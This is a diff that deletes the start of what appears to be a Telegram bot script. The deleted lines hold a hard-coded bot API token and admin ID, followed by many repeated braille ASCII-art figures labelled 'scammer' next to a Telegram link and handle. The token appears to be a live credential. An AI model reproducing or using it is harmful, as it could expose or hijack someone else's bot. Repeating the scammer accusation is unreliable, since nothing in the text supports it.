@@ -1,505 +1,271 @@
 
-
-
-
-
-
-
-API_TOKEN = '7332563342:AAHePWCDIdvkmHF0ZF3Jh_hX8h4lOVJ6fMw'
-
-
-
-ADMIN_ID = 1245141457
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-'''#By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-#@gazig4369
-#⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀#
-⠀#⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀#⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀#⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀#⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀#⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-#⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀#⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀#
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿
-By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷    scammer👇🏻       
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿By  https://t.me/+a2kaW4rQh0ZhMzY9  ☠️ @gazig4369☠️:
-@gazig4369
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
